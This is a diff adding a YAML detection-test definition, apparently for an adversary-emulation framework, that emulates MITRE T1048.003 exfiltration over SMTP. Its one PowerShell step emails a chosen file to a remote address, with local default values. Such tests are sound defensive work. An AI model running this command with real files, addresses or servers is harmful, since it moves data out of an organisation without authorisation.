@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: Exfiltration Over Alternative Protocol - SMTP
+description: |
+    Exfiltration of specified file over SMTP.
+    Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.
+args:
+    - name: input_file
+      type: path
+      default: C:\Windows\System32\notepad.exe
+    - name: sender
+      type: string
+      default: test@corp.com
+    - name: receiver
+      type: string
+      default: test@corp.com
+    - name: smtp_server
+      type: string
+      default: 127.0.0.1
+uuid: ec3a835e-adca-4c7c-88d2-853b69c11bb9
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1048: Exfiltration Over Alternative Protocol'
+    subtechniques:
+        - 'T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: exfiltration-over-alternative-protocol---smtp
+      inline: |
+        Send-MailMessage -From {{.Args.sender}} -To {{.Args.receiver}} -Subject "T1048.003 Atomic Test" -Attachments {{.Args.input_file}} -SmtpServer {{.Args.smtp_server}}
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
